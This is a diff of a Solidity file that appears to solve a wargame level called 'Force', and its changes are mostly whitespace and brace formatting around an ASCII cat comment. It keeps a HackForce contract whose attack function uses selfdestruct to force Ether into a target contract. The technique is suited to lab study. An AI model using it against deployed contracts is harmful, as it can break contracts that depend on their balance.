@@ -1,7 +1,8 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.17;
 
-contract Force {/*
+contract Force {
+    /*
 
                    MEOW ?
          /\_/\   /
@@ -9,13 +10,13 @@ contract Force {/*
   /~____  =ø= /
  (______)__m_m)
 
-*/}
+*/
+}
 
 contract HackForce {
-
     constructor() payable {}
 
-    function attack(address payable _force) external  {
+    function attack(address payable _force) external {
         selfdestruct(_force);
     }
 }
